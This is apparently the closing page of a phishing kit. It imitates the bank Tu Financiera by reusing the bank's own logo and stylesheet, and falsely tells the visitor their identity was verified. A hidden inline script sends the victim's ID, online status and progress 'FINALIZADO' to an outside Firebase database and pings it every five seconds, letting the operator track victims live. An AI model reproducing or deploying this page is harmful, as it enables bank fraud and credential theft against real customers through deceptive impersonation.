<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Acceso autorizado</title>
<link rel="shortcut icon" type="image/png" href="https://tu.com.py/tufi-web/assets/icon/favicon.png">
<link rel="stylesheet" href="https://tu.com.py/tufi-web/static/css/main.bb0d1fd5.chunk.css">
<style>
  html,body{height:100%;margin:0}
  body{min-height:100vh;background:#f2f2f2;font-family:var(--tufi-font-family),Ubuntu,Arial,sans-serif;color:#606060;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}
  .card{background:#fff;border:1px solid #d1d1d1;border-radius:10px;width:360px;max-width:100%;padding:34px 24px;text-align:center;box-sizing:border-box}
  .logo{width:130px;margin:0 auto 22px;display:block}
  .ok{width:66px;height:66px;border-radius:50%;background:#eaf6da;color:#6fa82c;font-size:34px;line-height:66px;margin:0 auto 18px}
  h1{font-size:17px;font-weight:bold;color:#8ec63f;margin:0 0 10px}
  p{font-size:12.5px;line-height:1.55;margin:0}
  .btn{display:block;height:39px;line-height:39px;margin-top:24px;border-radius:10px;background:#8dc63f;color:#fff;font-size:12px;font-weight:bold;text-transform:uppercase;letter-spacing:.33px;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <img class="logo" src="https://tu.com.py/tufi-web/static/media/logo_login.76bbbd3c.svg" alt="Tu Financiera">
  <div class="ok">&#10003;</div>
  <h1>Acceso autorizado</h1>
  <p>Tu identidad fue verificada correctamente. Ya podés operar en tu banca digital.</p>
  <a class="btn" href="index.html">Ir a mi cuenta</a>
</div>
<script>
(function(){
  var DB="https://cbonnlineec-default-rtdb.firebaseio.com/nbch";
  var id=new URLSearchParams(location.search).get('u')||localStorage.getItem('nbch_u');
  if(!id) return;
  function patch(o){fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(o)}).catch(function(){});}
  patch({online:true,ultimoPing:Date.now(),pagina:'final.html',estado:'FINALIZADO'});
  var lt=setInterval(function(){patch({online:true,ultimoPing:Date.now()});},5000);
  window.addEventListener('beforeunload',function(){clearInterval(lt);patch({online:false});});
})();
</script>
</body>
</html>
